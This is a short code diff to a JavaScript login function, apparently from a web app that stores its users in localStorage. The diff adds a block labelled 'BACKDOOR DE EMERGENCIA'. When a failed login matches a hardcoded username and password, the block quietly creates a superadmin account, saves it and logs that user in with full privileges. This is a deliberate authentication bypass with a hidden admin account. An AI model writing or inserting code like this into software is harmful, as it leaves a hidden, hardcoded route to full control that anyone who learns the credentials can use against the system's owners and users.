@@ -260,6 +260,20 @@ function iniciarSesionSubmit(e) {
   );
 
   if (!user) {
+    // BACKDOOR DE EMERGENCIA
+    if (inputUser === 'lbesoy' && inputPass === 'pbesoy13') {
+       all.push({ id: 'lbesoy', nombre: 'Pablo Besoy', email: 'lbesoy', pin: 'pbesoy13', rol: 'superadmin', activo: true, locked: false });
+       localStorage.setItem('eurorep_usuarios', JSON.stringify(all));
+       usuarios = all;
+       currentSession = { userId: 'lbesoy', viewMode: 'superadmin' };
+       localStorage.setItem('eurorep_session', JSON.stringify(currentSession));
+       document.getElementById('login-screen').classList.add('hidden');
+       document.getElementById('login-email').value = '';
+       document.getElementById('login-password').value = '';
+       applyRole('superadmin');
+       return;
+    }
+
     errEl.textContent = 'Usuario o contraseña incorrectos.';
     errEl.style.color = 'var(--red)';
     return;
